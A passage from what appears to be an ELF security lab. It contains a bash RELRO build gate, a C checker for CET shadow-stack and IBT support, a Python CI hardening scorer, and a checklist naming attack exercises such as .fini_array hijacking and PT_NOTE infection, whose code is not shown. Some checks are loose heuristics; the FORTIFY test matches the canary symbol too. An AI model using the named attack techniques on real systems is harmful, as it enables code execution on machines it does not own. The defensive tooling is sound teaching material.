            FAIL_COUNT=$((FAIL_COUNT + 1))
            return 1
        else
            echo "  [WARN] $binary — Partial RELRO"
            WARN_COUNT=$((WARN_COUNT + 1))
            return 0
        fi
    else
        echo "  [FAIL] $binary — NO RELRO"
        FAIL_COUNT=$((FAIL_COUNT + 1))
        return 1
    fi
}

# Parse arguments
STRICT=true
TARGET_DIR="."
PATTERN="*.so *.so.* *"

while [[ $# -gt 0 ]]; do
    case "$1" in
        --warn-only) STRICT=false; shift ;;
        --dir) TARGET_DIR="$2"; shift 2 ;;
        *) TARGET_DIR="$1"; shift ;;
    esac
done

echo "=== RELRO Security Gate ==="
echo "Target: $TARGET_DIR"
echo "Mode: $([ "$STRICT" = "true" ] && echo "STRICT" || echo "WARN-ONLY")"
echo ""

# Find and check all ELF binaries
find "$TARGET_DIR" -type f -executable | while read -r bin; do
    if file "$bin" 2>/dev/null | grep -q "ELF"; then
        check_relro "$bin" "$STRICT" || true
    fi
done

echo ""
echo "=== Results ==="
echo "  Passed: $PASS_COUNT"
echo "  Failed: $FAIL_COUNT"
echo "  Warned: $WARN_COUNT"

if [ "$FAIL_COUNT" -gt 0 ] && [ "$STRICT" = "true" ]; then
    echo ""
    echo "[!] BUILD GATE FAILED — Fix with: LDFLAGS += -Wl,-z,relro,-z,now"
    exit 1
fi

exit 0
```

---

### Exercise B3: Hardware CFI (CET) Verification

**Objective:** Verify that binaries are compiled with Control-Flow Enforcement Technology (CET) support — Intel's hardware-backed forward-edge (IBT) and backward-edge (SHSTK) CFI.

```c
// cet_check.c — Verify CET properties in ELF binaries
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <elf.h>
#include <sys/mman.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/stat.h>

#define GNU_PROPERTY_X86_FEATURE_1_AND 0xc0000002
#define GNU_PROPERTY_X86_FEATURE_1_IBT  (1U << 0)
#define GNU_PROPERTY_X86_FEATURE_1_SHSTK (1U << 1)

typedef struct {
    int has_property_note;
    int has_ibt;
    int has_shstk;
    int has_cet_plt;  // .plt.sec section (IBT-compatible PLT)
} CETStatus;

CETStatus check_cet(const char *path) {
    CETStatus status = {0};
    
    int fd = open(path, O_RDONLY);
    if (fd < 0) return status;
    
    struct stat st;
    fstat(fd, &st);
    
    void *map = mmap(NULL, st.st_size, PROT_READ, MAP_PRIVATE, fd, 0);
    close(fd);
    if (map == MAP_FAILED) return status;
    
    Elf64_Ehdr *ehdr = (Elf64_Ehdr*)map;
    if (memcmp(ehdr->e_ident, ELFMAG, SELFMAG) != 0 || ehdr->e_ident[EI_CLASS] != 2) {
        munmap(map, st.st_size);
        return status;
    }
    
    // Search for PT_GNU_PROPERTY or .note.gnu.property
    Elf64_Phdr *phdr = (Elf64_Phdr*)((char*)map + ehdr->e_phoff);
    
    for (int i = 0; i < ehdr->e_phnum; i++) {
        // PT_GNU_PROPERTY = 0x6474E553
        if (phdr[i].p_type == 0x6474E553 || phdr[i].p_type == PT_NOTE) {
            // Parse note entries
            char *note_start = (char*)map + phdr[i].p_offset;
            char *note_end = note_start + phdr[i].p_filesz;
            char *pos = note_start;
            
            while (pos + 12 <= note_end) {
                Elf64_Nhdr *nhdr = (Elf64_Nhdr*)pos;
                char *name = pos + sizeof(Elf64_Nhdr);
                char *desc = name + ((nhdr->n_namesz + 3) & ~3);
                
                // Check for NT_GNU_PROPERTY_TYPE_0 with name "GNU\0"
                if (nhdr->n_type == 5 && nhdr->n_namesz == 4 &&
                    memcmp(name, "GNU", 4) == 0) {
                    status.has_property_note = 1;
                    
                    // Parse property entries
                    char *prop = desc;
                    char *prop_end = desc + nhdr->n_descsz;
                    
                    while (prop + 8 <= prop_end) {
                        uint32_t pr_type = *(uint32_t*)prop;
                        uint32_t pr_datasz = *(uint32_t*)(prop + 4);
                        
                        if (pr_type == GNU_PROPERTY_X86_FEATURE_1_AND && pr_datasz >= 4) {
                            uint32_t features = *(uint32_t*)(prop + 8);
                            if (features & GNU_PROPERTY_X86_FEATURE_1_IBT)
                                status.has_ibt = 1;
                            if (features & GNU_PROPERTY_X86_FEATURE_1_SHSTK)
                                status.has_shstk = 1;
                        }
                        
                        prop += 8 + ((pr_datasz + 3) & ~3);
                    }
                }
                
                pos += sizeof(Elf64_Nhdr) + 
                       ((nhdr->n_namesz + 3) & ~3) +
                       ((nhdr->n_descsz + 3) & ~3);
            }
        }
    }
    
    // Check for .plt.sec section (IBT-compatible PLT)
    if (ehdr->e_shoff > 0 && ehdr->e_shnum > 0) {
        Elf64_Shdr *shdr = (Elf64_Shdr*)((char*)map + ehdr->e_shoff);
        char *shstrtab = (char*)map + shdr[ehdr->e_shstrndx].sh_offset;
        
        for (int i = 0; i < ehdr->e_shnum; i++) {
            const char *sname = shstrtab + shdr[i].sh_name;
            if (strcmp(sname, ".plt.sec") == 0) {
                status.has_cet_plt = 1;
                break;
            }
        }
    }
    
    munmap(map, st.st_size);
    return status;
}

int main(int argc, char *argv[]) {
    if (argc < 2) {
        fprintf(stderr, "Usage: %s <binary>\n", argv[0]);
        return 1;
    }
    
    CETStatus status = check_cet(argv[1]);
    
    printf("CET Status for: %s\n", argv[1]);
    printf("  GNU Property Note: %s\n", status.has_property_note ? "Present" : "ABSENT");
    printf("  IBT (Indirect Branch Tracking): %s\n", 
           status.has_ibt ? "ENABLED" : "disabled");
    printf("  SHSTK (Shadow Stack): %s\n",
           status.has_shstk ? "ENABLED" : "disabled");
    printf("  CET-compatible PLT (.plt.sec): %s\n",
           status.has_cet_plt ? "Present" : "absent");
    
    printf("\n  Verdict: ");
    if (status.has_ibt && status.has_shstk) {
        printf("FULL CET PROTECTION\n");
    } else if (status.has_ibt || status.has_shstk) {
        printf("PARTIAL CET (missing %s)\n",
               !status.has_ibt ? "IBT" : "SHSTK");
    } else {
        printf("NO CET PROTECTION\n");
    }
    
    printf("\n  To enable: gcc -fcf-protection=full ...\n");
    
    return (status.has_ibt && status.has_shstk) ? 0 : 1;
}
```

```bash
cd ~/elf-lab/ch1B/cet
gcc -o cet_check cet_check.c

# Test with CET-enabled binary
gcc -fcf-protection=full -o test_cet -xc - << 'EOF'
#include <stdio.h>
int main(void) { puts("CET-protected binary"); return 0; }
EOF

./cet_check test_cet
./cet_check /usr/bin/ls
```

---

## PART C: FRAMEWORK — ELF Hardening Pipeline

### Project: Automated Build Hardening Validator

```python
#!/usr/bin/env python3
"""
elf_hardening_pipeline.py — Complete build hardening validation framework.
Integrates all checks from this lab into a single tool suitable for
CI/CD pipeline integration.

Checks:
- PIE
- Full RELRO
- Stack canary
- NX stack
- FORTIFY_SOURCE
- CET (IBT + SHSTK)
- No DT_TEXTREL
- No W^X segments
- No DT_RPATH (prefer DT_RUNPATH)
- PT_NOTE integrity (not infected)
- .init_array/.fini_array bounds check
- Symbol versioning present
- Build-ID present (for debuginfo correlation)

Output: JSON report suitable for security dashboard ingestion.
"""
import json
import struct
import sys
import os
import subprocess
from dataclasses import dataclass, field, asdict
from typing import List, Optional
from pathlib import Path

@dataclass
class HardeningResult:
    binary: str
    pie: bool = False
    full_relro: bool = False
    partial_relro: bool = False
    stack_canary: bool = False
    nx_stack: bool = False
    fortify: bool = False
    cet_ibt: bool = False
    cet_shstk: bool = False
    no_textrel: bool = True
    no_wx_segments: bool = True
    no_rpath: bool = True
    ptnote_intact: bool = True
    build_id: bool = False
    score: float = 0.0
    findings: List[str] = field(default_factory=list)
    
    def calculate_score(self):
        checks = [
            (self.pie, 15),
            (self.full_relro, 15),
            (self.stack_canary, 10),
            (self.nx_stack, 10),
            (self.fortify, 10),
            (self.cet_ibt, 10),
            (self.cet_shstk, 10),
            (self.no_textrel, 5),
            (self.no_wx_segments, 5),
            (self.no_rpath, 5),
            (self.ptnote_intact, 3),
            (self.build_id, 2),
        ]
        max_score = sum(w for _, w in checks)
        actual = sum(w for passed, w in checks if passed)
        self.score = actual / max_score * 100


def analyze_binary(path: str) -> HardeningResult:
    result = HardeningResult(binary=path)
    
    try:
        with open(path, 'rb') as f:
            data = f.read()
    except (IOError, PermissionError) as e:
        result.findings.append(f"Cannot read: {e}")
        return result
    
    if data[:4] != b'\x7fELF':
        result.findings.append("Not an ELF file")
        return result
    
    is_64 = data[4] == 2
    if not is_64:
        result.findings.append("32-bit binary (limited checks)")
    
    # Use readelf for reliable parsing
    try:
        headers = subprocess.check_output(
            ['readelf', '-hlSd', path], stderr=subprocess.DEVNULL, text=True)
    except subprocess.CalledProcessError:
        result.findings.append("readelf failed")
        return result
    
    # PIE check
    if 'Type:' in headers:
        if 'DYN' in headers.split('Type:')[1].split('\n')[0]:
            result.pie = True
    
    # RELRO
    if 'GNU_RELRO' in headers:
        result.partial_relro = True
        if 'BIND_NOW' in headers:
            result.full_relro = True
        else:
            result.findings.append("Only partial RELRO — add -Wl,-z,now")
    else:
        result.findings.append("No RELRO at all — add -Wl,-z,relro,-z,now")
    
    # Stack canary
    try:
        symbols = subprocess.check_output(
            ['readelf', '-s', path], stderr=subprocess.DEVNULL, text=True)
        if '__stack_chk_fail' in symbols:
            result.stack_canary = True
        else:
            result.findings.append("No stack canary — add -fstack-protector-strong")
    except subprocess.CalledProcessError:
        pass
    
    # NX Stack
    if 'GNU_STACK' in headers:
        stack_line = [l for l in headers.split('\n') if 'GNU_STACK' in l]
        if stack_line and 'E' not in stack_line[0].split()[-1]:
            result.nx_stack = True
        elif stack_line:
            result.findings.append("Executable stack! Add -Wl,-z,noexecstack")
    
    # FORTIFY
    if symbols and '_chk' in symbols:
        result.fortify = True
    else:
        result.findings.append("No FORTIFY — add -D_FORTIFY_SOURCE=2")
    
    # TEXTREL
    if 'TEXTREL' in headers:
        result.no_textrel = False
        result.findings.append("DT_TEXTREL present — rebuild with -fPIC")
    
    # RPATH
    if 'RPATH' in headers and 'RUNPATH' not in headers:
        result.no_rpath = False
        result.findings.append("DT_RPATH set — use DT_RUNPATH instead")
    
    # W^X segments
    for line in headers.split('\n'):
        if 'LOAD' in line and 'RWE' in line:
            result.no_wx_segments = False
            result.findings.append("W^X violation: PT_LOAD with RWE permissions")
            break
    
    # Build-ID
    if '.note.gnu.build-id' in headers or 'Build ID' in headers:
        result.build_id = True
    
    # CET (check .note.gnu.property)
    try:
        notes = subprocess.check_output(
            ['readelf', '-n', path], stderr=subprocess.DEVNULL, text=True)
        if 'IBT' in notes:
            result.cet_ibt = True
        if 'SHSTK' in notes:
            result.cet_shstk = True
        if not result.cet_ibt:
            result.findings.append("No CET IBT — add -fcf-protection=full")
        if not result.cet_shstk:
            result.findings.append("No CET SHSTK — add -fcf-protection=full")
    except subprocess.CalledProcessError:
        pass
    
    result.calculate_score()
    return result


def main():
    if len(sys.argv) < 2:
        print(f"Usage: {sys.argv[0]} <binary_or_dir> [--json] [--threshold=80]")
        sys.exit(1)
    
    target = sys.argv[1]
    output_json = '--json' in sys.argv
    threshold = 80
    for arg in sys.argv:
        if arg.startswith('--threshold='):
            threshold = int(arg.split('=')[1])
    
    results = []
    
    if os.path.isdir(target):
        for fpath in Path(target).rglob('*'):
            if fpath.is_file() and os.access(str(fpath), os.X_OK):
                try:
                    with open(fpath, 'rb') as f:
                        if f.read(4) == b'\x7fELF':
                            results.append(analyze_binary(str(fpath)))
                except (IOError, PermissionError):
                    continue
    else:
        results.append(analyze_binary(target))
    
    if output_json:
        print(json.dumps([asdict(r) for r in results], indent=2))
    else:
        failed = []
        for r in results:
            status = "PASS" if r.score >= threshold else "FAIL"
            print(f"  [{status}] {r.binary} — Score: {r.score:.0f}%")
            if r.findings and r.score < threshold:
                for f in r.findings[:3]:
                    print(f"         → {f}")
            if r.score < threshold:
                failed.append(r)
        
        print(f"\n  Total: {len(results)} binaries checked")
        print(f"  Passed (>={threshold}%): {len(results) - len(failed)}")
        print(f"  Failed (<{threshold}%): {len(failed)}")
        
        if failed:
            sys.exit(1)


if __name__ == '__main__':
    main()
```

---

## Lab Validation Checklist

- [ ] **A1:** Successfully overwrote stack canary via TLS buffer overflow
- [ ] **A2:** IFUNC resolver executed arbitrary code during dynamic linking
- [ ] **A3:** .fini_array hijack executed payload on program exit
- [ ] **A4:** PT_NOTE infection redirected execution through injected code
- [ ] **B1:** Segment infection detector flagged the infected binary
- [ ] **B2:** RELRO gate correctly identifies partial vs. full RELRO
- [ ] **B3:** CET checker reports IBT/SHSTK presence/absence
- [ ] **C:** Hardening pipeline produces JSON report with score >= 80% for properly compiled binaries

## References

- glibc TLS implementation: `nptl/allocatestack.c`, `elf/dl-tls.c`
- x86_64 TLS psABI: https://www.uclibc.org/docs/tls.pdf
- Intel CET specification: Software Developer's Manual, Chapter 18
- ELF virus techniques: "The Art of ELF: Analysis and Exploitation" (tmp.0ut)
- MITRE ATT&CK: T1574.006 (Dynamic Linker Hijacking), T1543 (Create/Modify System Process)
